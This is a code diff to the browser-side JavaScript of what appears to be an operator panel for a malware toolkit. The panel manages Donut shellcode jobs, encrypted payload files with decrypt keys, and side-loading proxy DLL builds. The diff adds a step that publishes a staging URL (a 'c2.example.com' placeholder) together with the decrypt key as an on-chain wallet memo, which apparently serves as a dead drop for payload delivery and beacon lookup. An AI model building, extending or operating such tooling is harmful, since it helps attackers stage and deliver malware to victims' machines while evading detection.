-  const body = { name, ...collectFormData() };
+// ── Build save row ────────────────────────────────────────────────────────
 
-  if (_currentProfileId) {
-    // Update in place
-    await fetch(`/api/profiles/${_currentProfileId}`, {
-      method: "PUT",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(body),
-    });
-    _currentProfileName = name;  // reflect any rename
-    $("#btn-show-save-profile").textContent = `↺ ${name}`;
+const _bldSaveRow = _makeSaveRow(
+  "bld-profile-save-row", "bld-profile-name-input",
+  "btn-confirm-save-bld-profile", "btn-cancel-save-bld-profile", "btn-bld-saveas-new",
+  () => _curBldProfileId, () => _curBldProfileName,
+  v => { _curBldProfileId = v; }, v => { _curBldProfileName = v; },
+  "/api/profiles/build", () => refreshBldProfiles(), "btn-show-save-bld-profile"
+);
+function _openBldSaveRow(forceNew) { _bldSaveRow.open(forceNew); }
+
+$("#btn-confirm-save-bld-profile").addEventListener("click", async () => {
+  const name = $("#bld-profile-name-input").value.trim();
+  if (!name) { $("#bld-profile-name-input").focus(); return; }
+  const body = { name, ...collectBuildData() };
+  if (_curBldProfileId) {
+    await fetch(`/api/profiles/${_curBldProfileId}`, { method:"PUT", headers:{"Content-Type":"application/json"}, body:JSON.stringify(body) });
+    _curBldProfileName = name;
+    $("#btn-show-save-bld-profile").textContent = `↺ ${name}`;
   } else {
-    // Create new
-    const res  = await fetch("/api/profiles", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(body),
-    });
-    const json = await res.json().catch(() => ({}));
-    if (json.profile) {
-      _currentProfileId   = json.profile.id;
-      _currentProfileName = json.profile.name;
-      $("#btn-show-save-profile").textContent = `↺ ${json.profile.name}`;
-    }
+    const j = await fetch("/api/profiles/build", { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(body) }).then(r=>r.json()).catch(()=>({}));
+    if (j.profile) { _curBldProfileId = j.profile.id; _curBldProfileName = j.profile.name; $("#btn-show-save-bld-profile").textContent = `↺ ${j.profile.name}`; }
   }
-
-  _closeSaveRow();
-  refreshProfiles();
+  _bldSaveRow.close();
+  refreshBldProfiles();
 });
 
 // ─── encrypt history ─────────────────────────────────────────────────────
@@ -842,44 +858,44 @@ function renderEncryptHistory() {
   for (const j of _encryptHistory) {
     const el = document.createElement("div");
     el.className = "hist-item";
-    // store memo safely on the element — avoids quote-escaping issues
-    el.dataset.memo = j.memo || "";
+    // store key fragment safely on element — avoids quote-escaping issues
+    el.dataset.key = j.key || "";
 
-    const dot      = j.ok ? `<span class="ji-dot dot-ok">●</span>` : `<span class="ji-dot dot-bad">○</span>`;
-    const urlShort = j.url    ? trunc(j.url, 42)    : "—";
-    const wallet   = j.wallet ? trunc(j.wallet, 22) : "—";
-    const dateStr  = fmtTimeShort(j.created_at);
+    const dot        = j.ok ? `<span class="ji-dot dot-ok">●</span>` : `<span class="ji-dot dot-bad">○</span>`;
+    const wallet     = j.wallet ? trunc(j.wallet, 22) : "—";
+    const dateStr    = fmtTimeShort(j.created_at);
+    const donutBadge = j.donut_label
+      ? `<span class="ji-label-badge">${j.donut_label}</span>`
+      : "";
 
     // download links
-    let dls = `<a class="btn-xs" href="/api/encrypt/history/${j.id}/download/memo">↓ memo</a>`;
-    dls    += ` <a class="btn-xs" href="/api/encrypt/history/${j.id}/download/payload_h">↓ Payload.h</a>`;
-    if (j.dat_name && j.dat_size > 0)
-      dls  += ` <a class="btn-xs primary" href="/api/encrypt/history/${j.id}/download/dat">↓ ${j.dat_name}</a>`;
+    let dls = `<a class="btn-xs" href="/api/encrypt/history/${j.id}/download/payload_h">↓ Payload.h</a>`;
+    if (j.dat_size > 0)
+      dls += ` <a class="btn-xs primary" href="/api/encrypt/history/${j.id}/download/dat">↓ data.enc</a>`;
 
     // action buttons
-    const copyBtnHtml    = j.memo ? `<button class="btn-xs btn-hist-copy">Copy memo</button>` : "";
-    // Publish button: only if we have a memo AND a wallet_id in workspace
-    const canPublish     = j.memo && j.wallet_id;
+    const copyBtnHtml    = j.key ? `<button class="btn-xs btn-hist-copy">Copy key</button>` : "";
+    const canPublish     = j.key && j.wallet_id;
     const publishBtnHtml = canPublish ? `<button class="btn-xs btn-hist-pub">⚡ Publish</button>` : "";
 
     el.innerHTML = `
       <div class="hist-head">
         ${dot}
-        <span class="hist-name">${urlShort}</span>
+        <span class="hist-name">${wallet}</span>
         <button class="btn-xs btn-danger hist-del" title="Delete run + files">✕</button>
       </div>
       <div class="hist-meta">
         <span class="ji-id">#${j.id}</span>
-        <span>${wallet}</span>
-        <span>${j.dat_size ? fmtSize(j.dat_size) + " dat" : ""}</span>
+        ${donutBadge}
+        <span>${j.dat_size ? fmtSize(j.dat_size) + " enc" : ""}</span>
         <span>${dateStr}</span>
       </div>
       <div class="hist-dls">${dls} ${copyBtnHtml} ${publishBtnHtml}</div>
 
-      <!-- compact re-publish panel (hidden until ⚡ Publish clicked) -->
+      <!-- publish panel (hidden until ⚡ Publish clicked) -->
       <div class="hist-pub-panel hidden">
         <div class="hist-pub-row">
-          <input class="hist-pub-rpc" type="url" placeholder="RPC endpoint (optional)">
+          <input class="hist-pub-url" type="url" placeholder="Staging URL — https://c2.example.com/data.enc" style="flex:2">
           <button class="btn-xs primary hist-pub-btn">Publish on-chain</button>
         </div>
         <pre class="hist-pub-out"></pre>
@@ -893,11 +909,11 @@ function renderEncryptHistory() {
       deleteEncryptHistory(j.id);
     });
 
-    // ── wire copy memo ──
+    // ── wire copy key ──
     el.querySelector(".btn-hist-copy")?.addEventListener("click", () => {
-      const memo = el.dataset.memo;
-      if (!memo) return;
-      navigator.clipboard.writeText(memo).then(() => {
+      const key = el.dataset.key;
+      if (!key) return;
+      navigator.clipboard.writeText(key).then(() => {
         const btn = el.querySelector(".btn-hist-copy");
         const orig = btn.textContent;
         btn.textContent = "Copied!";
@@ -905,22 +921,27 @@ function renderEncryptHistory() {
       }).catch(() => {});
     });
 
-    // ── wire publish toggle (uses wallet already attached to this run) ──
+    // ── wire publish toggle ──
     el.querySelector(".btn-hist-pub")?.addEventListener("click", () => {
-      const panel = el.querySelector(".hist-pub-panel");
-      panel.classList.toggle("hidden");
+      el.querySelector(".hist-pub-panel").classList.toggle("hidden");
     });
 
-    // ── publish button: use j.wallet_id directly — no wallet picker needed ──
+    // ── publish button: join staging URL + stored key → memo, then post ──
     el.querySelector(".hist-pub-btn")?.addEventListener("click", async () => {
-      const panel = el.querySelector(".hist-pub-panel");
-      const out   = panel.querySelector(".hist-pub-out");
-      const rpc   = panel.querySelector(".hist-pub-rpc").value.trim();
-      const memo  = el.dataset.memo;
-      const wid   = j.wallet_id;
+      const panel      = el.querySelector(".hist-pub-panel");
+      const out        = panel.querySelector(".hist-pub-out");
+      const stagingUrl = panel.querySelector(".hist-pub-url").value.trim();
+      const key        = el.dataset.key;
+      const wid        = j.wallet_id;
 
-      if (!memo) { out.textContent = "[-] No memo stored."; out.className = "hist-pub-out bad"; return; }
-      if (!wid)  { out.textContent = "[-] Wallet not in workspace (manual address used)."; out.className = "hist-pub-out bad"; return; }
+      if (!stagingUrl || !stagingUrl.startsWith("http")) {
+        out.textContent = "[-] Staging URL required (must start with http).";
+        out.className = "hist-pub-out bad"; return;
+      }
+      if (!key) { out.textContent = "[-] No decrypt key stored."; out.className = "hist-pub-out bad"; return; }
+      if (!wid) { out.textContent = "[-] Wallet not in workspace (manual address used)."; out.className = "hist-pub-out bad"; return; }
+
+      const memo = `${stagingUrl}|${key}`;
 
       const btn = el.querySelector(".hist-pub-btn");
       btn.disabled = true; btn.textContent = "Publishing…";
@@ -930,7 +951,7 @@ function renderEncryptHistory() {
       try {
         const r = await fetch(`/api/wallets/${wid}/publish`, {
           method: "POST", headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ memo, rpc_url: rpc }),
+          body: JSON.stringify({ memo }),
         });
         const jr = await r.json();
         if (jr.ok) {
@@ -988,8 +1009,12 @@ function renderBuildHistory() {
     let dls = `<a class="btn-xs" href="/api/build/history/${j.id}/download/output" title="Download build log">↓ log</a>`;
     if (j.zip_size > 0)
       dls += ` <a class="btn-xs primary" href="/api/build/history/${j.id}/download/zip" title="Download deployment ZIP">↓ ${j.zip_name}</a>`;
-    else if (j.binary_size > 0)
+    if (j.binary_size > 0 && (j.mode !== "sideload" || !j.zip_size))
       dls += ` <a class="btn-xs primary" href="/api/build/history/${j.id}/download/binary" title="Download ${j.binary_name}">↓ ${j.binary_name}</a>`;
+    if (j.mode === "sideload" && j.binary_size > 0)
+      dls += ` <a class="btn-xs" href="/api/build/history/${j.id}/download/binary" title="Download standalone proxy DLL">↓ dll</a>`;
+    if (j.sideload_h_size > 0)
+      dls += ` <a class="btn-xs" href="/api/build/history/${j.id}/download/sideload_h" title="Download Sideload.h">↓ Sideload.h</a>`;
 
     el.innerHTML = `
       <div class="hist-head">
@@ -1044,11 +1069,22 @@ function renderDonutJobs() {
     el.className = "job-item";
     const statusDot = j.ok ? "●" : "○";
     const statusCls = j.ok ? "dot-ok" : "dot-bad";
+    const labelBadge = j.label
+      ? `<span class="ji-label-badge">${j.label}</span>`
+      : "";
     el.innerHTML = `
       <div class="ji-head">
         <span class="ji-dot ${statusCls}">${statusDot}</span>
+        <span class="ji-id-inline">#${j.id.slice(0, 6)}</span>
+        ${labelBadge}
         <span class="ji-name">${j.original_name}</span>
+        <button class="btn-xs ji-edit" title="Edit label">✎</button>
         <button class="btn-xs btn-danger ji-del" data-jid="${j.id}" title="Delete">✕</button>
+      </div>
+      <div class="ji-label-row hidden">
+        <input class="ji-label-input" type="text" maxlength="64" placeholder="Label…" value="${j.label || ""}">
+        <button class="btn-xs primary ji-label-save">Save</button>
+        <button class="btn-xs ji-label-cancel">✕</button>
       </div>
       <div class="ji-meta">
         <span class="ji-id">#${j.id}</span>
@@ -1063,11 +1099,33 @@ function renderDonutJobs() {
         <a class="btn-xs primary" href="/api/donut/jobs/${j.id}/download/shellcode">↓ shellcode</a>
       </div>` : ""}`;
     hist.insertBefore(el, hist.firstChild);
-    el.querySelector(".ji-del")?.addEventListener("click", (ev) => {
+
+    el.querySelector(".ji-del").addEventListener("click", (ev) => {
       ev.stopPropagation();
       deleteDonutJob(j.id);
     });
+
+    const labelRow    = el.querySelector(".ji-label-row");
+    const labelInput  = el.querySelector(".ji-label-input");
+    el.querySelector(".ji-edit").addEventListener("click", () => {
+      labelRow.classList.toggle("hidden");
+      if (!labelRow.classList.contains("hidden")) labelInput.focus();
+    });
+    el.querySelector(".ji-label-cancel").addEventListener("click", () =>
+      labelRow.classList.add("hidden"));
+    el.querySelector(".ji-label-save").addEventListener("click", () =>
+      saveDonutLabel(j.id, labelInput.value));
   }
+}
+
+async function saveDonutLabel(id, label) {
+  await fetch(`/api/donut/jobs/${id}`, {
+    method: "PATCH",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ label: label.trim() }),
+  });
+  await refreshDonutJobs();
+  refreshEncryptDropdowns();
 }
 
 async function deleteDonutJob(id) {
@@ -1251,8 +1309,7 @@ $("#form-publish").addEventListener("submit", async (e) => {
     const r = await fetch(`/api/wallets/${_selWalletId}/publish`, {
       method: "POST", headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        memo:    $("#wp-memo").value.trim(),
-        rpc_url: $("#wp-rpc").value.trim(),
+        memo: $("#wp-memo").value.trim(),
       }),
     });
     const j = await r.json();
@@ -1279,10 +1336,7 @@ async function doLookup(mode) {
   try {
     const r = await fetch(`/api/wallets/${_selWalletId}/lookup`, {
       method: "POST", headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        rpc_url: $("#wp-rpc").value.trim(),
-        mode,
-      }),
+      body: JSON.stringify({ mode }),
     });
     const j = await r.json();
     if (j.found) {
@@ -1301,11 +1355,80 @@ async function doLookup(mode) {
 $("#btn-lookup-latest").addEventListener("click", () => doLookup("latest"));
 $("#btn-lookup-beacon").addEventListener("click", () => doLookup("beacon"));
 
+// ─── Payload.h selector (build panel) ────────────────────────────────────
+
+async function refreshPayloadSelector() {
+  const wrap   = $("#bld-payload-sel-wrap");
+  const hidden = $("#bld-payload-sel");
+  if (!wrap || !hidden) return;
+  const prev = hidden.value;
+  const list = wrap.querySelector(".cdd-list");
+
+  try {
+    const runs = await fetch("/api/encrypt/history").then(r => r.json());
+    list.innerHTML = "";
+
+    // placeholder
+    const ph = document.createElement("div");
+    ph.className = "cdd-item cdd-placeholder";
+    ph.textContent = "— use existing Payload.h in project root —";
+    ph.addEventListener("click", () => {
+      hidden.value = "";
+      _cddSetDisplay(wrap, "— use existing Payload.h in project root —");
+      wrap.querySelectorAll(".cdd-item").forEach(i => i.classList.remove("cdd-selected"));
+      _cddClose();
+    });
+    list.appendChild(ph);
+
+    const ok = runs.filter(r => r.ok);
+    for (const r of ok) {
+      const item = document.createElement("div");
+      item.className = "cdd-item";
+      item.dataset.value = r.id;
+      const wallet     = r.wallet      ? trunc(r.wallet, 20) : "—";
+      const labelHtml  = r.donut_label
+        ? `<span class="cdd-label-badge">${r.donut_label}</span>`
+        : "";
+      item.innerHTML = `
+        <span class="cdd-item-id">#${r.id.slice(0,6)}</span>
+        ${labelHtml}
+        <span class="cdd-item-name">${wallet}</span>
+        <span class="cdd-item-meta">${fmtTimeShort(r.created_at)}</span>`;
+      item.addEventListener("click", () => {
+        hidden.value = r.id;
+        _cddSetDisplay(wrap, item.innerHTML);
+        wrap.querySelectorAll(".cdd-item").forEach(i => i.classList.toggle("cdd-selected", i === item));
+        _cddClose();
+      });
+      if (r.id === prev) {
+        item.classList.add("cdd-selected");
+        _cddSetDisplay(wrap, item.innerHTML);
+      }
+      list.appendChild(item);
+    }
+
+    if (!prev || !ok.find(r => r.id === prev)) {
+      _cddSetDisplay(wrap, "— use existing Payload.h in project root —");
+      hidden.value = "";
+    }
+
+    const trigger = wrap.querySelector(".cdd-trigger");
+    trigger.onclick = (e) => {
+      e.stopPropagation();
+      const isOpen = wrap.classList.contains("open");
+      _cddClose();
+      if (!isOpen) { wrap.classList.add("open"); list.classList.remove("hidden"); }
+    };
+  } catch (_) {}
+}
+
 // ─── boot ─────────────────────────────────────────────────────────────────
 
 refreshStatus();
-refreshProfiles();
+refreshEncProfiles();
+refreshBldProfiles();
 refreshEncryptDropdowns();
-refreshSideloadAssets();   // loads _dlls/_exes and populates selectors
+refreshSideloadAssets();
 refreshEncryptHistory();
 refreshBuildHistory();
+refreshPayloadSelector();
